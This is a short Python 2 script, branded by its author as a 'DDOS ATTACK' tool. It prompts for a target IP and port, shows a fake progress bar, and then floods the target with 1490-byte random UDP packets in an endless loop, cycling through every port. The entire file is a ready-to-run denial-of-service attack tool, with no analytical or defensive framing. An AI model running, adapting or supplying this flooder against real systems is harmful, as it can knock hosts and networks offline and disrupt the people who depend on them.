import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print "\033[1;31mD3m0ni4k DDOS ATTACK\033[1;31m"
print
os.system("screenfetch -A Debian")
print "\033[1;30mVERS       :   0.1 \033[1;30m"
print "\033[0;31mTEAM       :   r3v0lt \033[0;31m"
os.system("sleep 2")
print "\033[0;32mMade by    :   D3m0ni4k \033[0;32m"
print
os.system("sleep 2")
print "github     :   https://github.com/D3m0ni4k"
print
ip = raw_input("IP  : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet D3m0ni4k")
os.system("figlet Attack")
print "\033[1;31m[]                    [] 0% \033[1;31m"
time.sleep(5)
print "please wait...:    25%"
time.sleep(5)
print "please wait...:    50%"
time.sleep(5)
print "please wait...:    75%"
time.sleep(5)
print "[]DONE TIME... [] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
        port = 1
